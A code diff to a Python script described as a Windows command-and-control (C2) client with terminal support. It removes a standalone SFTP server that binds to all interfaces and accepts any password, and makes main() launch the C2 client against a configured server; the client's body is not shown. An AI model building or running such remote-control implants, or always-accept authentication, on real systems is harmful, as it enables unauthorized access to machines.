@@ -11,7 +11,6 @@ import platform
 import threading
 from typing import Dict, Any
 import winpty
-from sftp_handler import SimpleSFTPHandler
 
 
 logging.basicConfig(
@@ -20,175 +19,9 @@ logging.basicConfig(
     handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger('C2Client')
-logger = logging.getLogger('ClientSFTPServer')
 
 # Generate a host key for the SFTP server
 HOST_KEY = paramiko.RSAKey.generate(2048)
-
-import paramiko
-import os
-import logging
-from paramiko.sftp_handle import SFTPHandle
-from paramiko.sftp_attr import SFTPAttributes
-
-logger = logging.getLogger('ClientSFTPServer')
-import paramiko
-import os
-import logging
-import threading
-import time
-import socket
-
-logger = logging.getLogger('SimpleSFTPServer')
-
-
-# Complete standalone SFTP server
-class StandaloneSFTPServer:
-    def __init__(self, port=2222, host_key=None):
-        self.port = port
-        if host_key is None:
-            self.host_key = paramiko.RSAKey.generate(2048)
-        else:
-            self.host_key = host_key
-        self.sock = None
-        self.server_thread = None
-        self.running = False
-        self.connections = []
-
-    def start(self):
-        """Start the SFTP server"""
-        try:
-            # Bind to all interfaces
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.sock.bind(('', self.port))
-            self.sock.listen(5)
-            
-            self.running = True
-            self.server_thread = threading.Thread(target=self._run_server)
-            self.server_thread.daemon = True
-            self.server_thread.start()
-            
-            logger.info(f"SFTP server started on port {self.port}")
-            return True
-        except Exception as e:
-            logger.error(f"Failed to start SFTP server: {e}")
-            if self.sock:
-                self.sock.close()
-                self.sock = None
-            return False
-
-    def stop(self):
-        """Stop the SFTP server"""
-        self.running = False
-        
-        # Close all connections
-        for t in self.connections:
-            try:
-                t.close()
-            except:
-                pass
-        self.connections = []
-        
-        # Close the socket
-        if self.sock:
-            try:
-                self.sock.close()
-            except:
-                pass
-            self.sock = None
-            
-        logger.info("SFTP server stopped")
-        return True
-
-    def _run_server(self):
-        """Accept and handle connections"""
-        try:
-            while self.running:
-                try:
-                    client_socket, addr = self.sock.accept()
-                    logger.debug(f"New connection from {addr[0]}:{addr[1]}")
-                    
-                    # Handle connection in a new thread
-                    t = threading.Thread(
-                        target=self._handle_connection,
-                        args=(client_socket, addr),
-                        daemon=True
-                    )
-                    t.start()
-                    self.connections.append(client_socket)
-                except (OSError, socket.error) as e:
-                    if not self.running:
-                        break
-                    logger.error(f"Socket error: {e}")
-                    time.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Server error: {e}")
-
-    def _handle_connection(self, client_socket, addr):
-        """Handle a client connection"""
-        transport = None
-        try:
-            # Set up the SSH transport
-            transport = paramiko.Transport(client_socket)
-            transport.add_server_key(self.host_key)
-            
-            # Use Paramiko's built-in SFTP server interface
-            transport.set_subsystem_handler('sftp', paramiko.SFTPServer)
-            transport.start_server(server=SFTPServerInterface())
-
-            # Wait for client channel
-            channel = transport.accept(20)
-            if channel is None:
-                logger.warning("No channel established")
-                return
-
-            # Keep connection alive until client disconnects
-            while transport.is_active():
-                time.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Error handling connection: {e}")
-        finally:
-            if transport:
-                try:
-                    transport.close()
-                except:
-                    pass
-            try:
-                client_socket.close()
-            except:
-                pass
-            if client_socket in self.connections:
-                self.connections.remove(client_socket)
-
-
-# Simple SSH server interface
-class SFTPServerInterface(paramiko.ServerInterface):
-    def __init__(self):
-        self.event = threading.Event()
-
-    def check_channel_request(self, kind, chanid):
-        logger.debug(f"Channel request: {kind}")
-        if kind == 'session':
-            return paramiko.OPEN_SUCCEEDED
-        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-
-    def check_auth_password(self, username, password):
-        # Accept any auth for now - we're running on localhost
-        logger.debug(f"Auth request for {username}")
-        return paramiko.AUTH_SUCCESSFUL
-
-    def check_channel_subsystem_request(self, channel, name):
-        logger.debug(f"Subsystem request: {name}")
-        if name == 'sftp':
-            return True
-        return False
-        
-    def get_allowed_auths(self, username):
-        return 'password'
-
-
-
 
 class C2Client:
     """Windows C2 Client with PTY support"""
@@ -411,24 +244,13 @@ def parse_arguments():
     return parser.parse_args()
 
 
+
 def main():
     args = parse_arguments()
     if args.debug:
         logger.setLevel(logging.DEBUG)
     config = {'server_ip': args.server, 'server_port': args.port, 'username': args.username, 'password': args.password}
-    
-    # Start the standalone SFTP server for testing
-    sftp_server = StandaloneSFTPServer(port=2222)
-    if sftp_server.start():
-        logger.info("Standalone SFTP server is running. Press Ctrl+C to stop.")
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            logger.info("Stopping SFTP server...")
-            sftp_server.stop()
-    else:
-        logger.error("Failed to start the standalone SFTP server.")
+    C2Client(config).run()
 
 if __name__ == '__main__':
     main()
